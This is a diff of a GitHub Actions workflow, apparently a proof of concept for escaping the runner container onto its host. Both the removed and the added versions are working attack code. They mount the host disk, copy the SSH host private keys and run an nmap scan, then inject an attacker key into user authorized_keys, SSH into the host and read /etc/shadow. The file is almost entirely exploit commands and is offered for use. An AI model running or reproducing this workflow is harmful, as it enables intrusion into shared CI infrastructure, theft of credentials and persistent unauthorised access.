@@ -1,128 +1,36 @@
-name: container-escape-poc
-run-name: ${{ github.actor }} is testing container escape
+name: github-actions-container-escape
+run-name: Container Escape POC
 on: [push]
 jobs:
-  exploit-test:
+  exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Check disk layout
-        run: lsblk
-      
-      - name: Check container capabilities
-        run: capsh --print | grep Current
-      
-      - name: Create mount directories
+      - name: Escape and compromise host
         run: |
-          sudo mkdir -p /mnt/host1
-          sudo mkdir -p /mnt/host2
-            
-      - name: Mount host filesystems
-        run: |
-          sudo mount -t ext4 /dev/sda1 /mnt/host1 || echo "Mount sda1 failed"
-          sudo mount -t ext4 /dev/root /mnt/host2 || echo "Mount root failed"
-      
-      - name: Verify users exist on host
-        run: |
-          echo "=== Checking for users on mounted host filesystems ==="
-          echo ""
-          echo "Contents of /mnt/host1/home:"
-          sudo ls -la /mnt/host1/home/ 2>/dev/null || echo "/mnt/host1/home not found"
-          echo ""
-          echo "Contents of /mnt/host2/home:"
-          sudo ls -la /mnt/host2/home/ 2>/dev/null || echo "/mnt/host2/home not found"
-          echo ""
-          echo "Users from /etc/passwd:"
-          sudo cat /mnt/host2/etc/passwd 2>/dev/null | grep -E "runner|cloudenv|ubuntu|azureuser|/home" || echo "No users in passwd"
-          echo ""
-          echo "All home directories found:"
-      
-      - name: Check SSH configuration on host
-        run: |
-          echo "=== Host SSH Configuration ==="
-          sudo cat /mnt/host2/etc/ssh/sshd_config | grep -E "Port|PermitRootLogin|PubkeyAuthentication|PasswordAuthentication" || echo "No sshd_config found"
-          echo ""
-          echo "SSH service status:"
-          sudo ls -la /mnt/host2/var/run/sshd* 2>/dev/null || echo "No sshd runtime files"
-      
-      - name: Detect host IP and scan ports
-        id: detect_host
-        run: |
-          # Get default gateway (host IP)
-          HOST_IP=$(ip route | grep default | awk '{print $3}')
-          echo "Detected host IP: $HOST_IP"
-          echo "host_ip=$HOST_IP" >> $GITHUB_OUTPUT
+          # Mount host filesystem
+          sudo mkdir -p /mnt/host
+          sudo mount /dev/sda1 /mnt/host
           
-          RUNNER_IP=$(hostname -I | awk '{print $1}')
-          echo "Runner IP: $RUNNER_IP"
-          echo "runner_ip=$RUNNER_IP" >> $GITHUB_OUTPUT
+          # Generate SSH key
+          ssh-keygen -t ed25519 -f /tmp/key -N ""
           
-          echo ""
-          echo "=== Network scan of host ==="
-          sudo apt install nmap
-          sudo nmap -Pn --open $RUNNER_IP -p- --min-rate=5000
-      
-      - name: Extract SSH host keys
-        run: |
-          sudo cat /mnt/host2/etc/ssh/ssh_host_rsa_key > /tmp/host_rsa_key || echo "No RSA key"
-          sudo cat /mnt/host2/etc/ssh/ssh_host_ed25519_key > /tmp/host_ed25519_key || echo "No ED25519 key"
-          sudo cat /mnt/host2/etc/ssh/ssh_host_ecdsa_key > /tmp/host_ecdsa_key || echo "No ECDSA key"
-          ls -la /tmp/host_* || echo "No keys extracted"
-      
-      - name: Generate exploit SSH key
-        run: |
-          ssh-keygen -t ed25519 -f /tmp/exploit_key -N ""
-          echo "Public key to inject:"
-          cat /tmp/exploit_key.pub
-      
-      - name: Find correct user and inject SSH key
-        run: |
-          echo "=== Looking for target user ==="
-          # Try multiple possible usernames
-          for user in cloudenv runner ubuntu azureuser; do
-            if sudo test -d /mnt/host2/home/$user; then
-              echo "Found user: $user"
-              sudo mkdir -p /mnt/host2/home/$user/.ssh
-              sudo bash -c "cat /tmp/exploit_key.pub > /mnt/host2/home/$user/.ssh/authorized_keys"
-              
-              # Get UID/GID from passwd
-              USER_UID=$(sudo cat /mnt/host2/etc/passwd | grep "^$user:" | cut -d: -f3)
-              USER_GID=$(sudo cat /mnt/host2/etc/passwd | grep "^$user:" | cut -d: -f4)
-              
-              sudo chown -R $USER_UID:$USER_GID /mnt/host2/home/$user/.ssh
-              sudo chmod 700 /mnt/host2/home/$user/.ssh
-              sudo chmod 600 /mnt/host2/home/$user/.ssh/authorized_keys
-              
-              echo "SSH key injected for user: $user (UID:$USER_UID GID:$USER_GID)"
-              sudo cat /mnt/host2/home/$user/.ssh/authorized_keys
-            fi
-          done
-      
-      - name: Attempt SSH connections
-        run: |
-          HOST_IP="${{ steps.detect_host.outputs.host_ip }}"
+          # Inject SSH key into host
+          sudo mkdir -p /mnt/host/home/runner/.ssh
+          sudo cp /tmp/key.pub /mnt/host/home/runner/.ssh/authorized_keys
+          sudo chown -R 1001:1001 /mnt/host/home/runner/.ssh
+          sudo chmod 700 /mnt/host/home/runner/.ssh
+          sudo chmod 600 /mnt/host/home/runner/.ssh/authorized_keys
           
-          for port in 22 2000 2222 22000; do
-            echo ""
-            echo "=== Trying SSH to $HOST_IP:$port ==="
-            
-            for user in cloudenv runner ubuntu azureuser root; do
-              timeout 5 ssh -i /tmp/exploit_key \
-                -p $port \
-                -o StrictHostKeyChecking=no \
-                -o UserKnownHostsFile=/dev/null \
-                -o ConnectTimeout=3 \
-                -o BatchMode=yes \
-                $user@$HOST_IP \
-                'whoami; hostname; id; pwd' 2>&1 && break || echo "Failed: $user@$HOST_IP:$port"
-            done
-          done
-      
-      - name: Display exploit summary
-        if: always()
-        run: |
-          echo "=== Final Summary ==="
-          echo "Host IP: ${{ steps.detect_host.outputs.host_ip }}"
-          echo "Runner IP: ${{ steps.detect_host.outputs.runner_ip }}"
-          echo "Host keys extracted: $(ls -1 /tmp/host_* 2>/dev/null | wc -l)"
-          echo ""
-          sudo cat /mnt/host2/etc/passwd | grep -E "runner|cloudenv|ubuntu|azureuser" || echo "No standard users found"
+          # Get host IP
+          HOST_IP=$(hostname -I | awk '{print $1}')
+          
+          # SSH to host and run commands
+          ssh -i /tmp/key -o StrictHostKeyChecking=no runner@$HOST_IP << 'EOF'
+          echo "=== CONTAINER ESCAPED TO HOST ==="
+          whoami
+          hostname
+          pwd
+          cd ../../../../.. && ls
+          cd ../../../../../../.. && cd home && ls
+          cat /etc/shadow | head -3
+          EOF
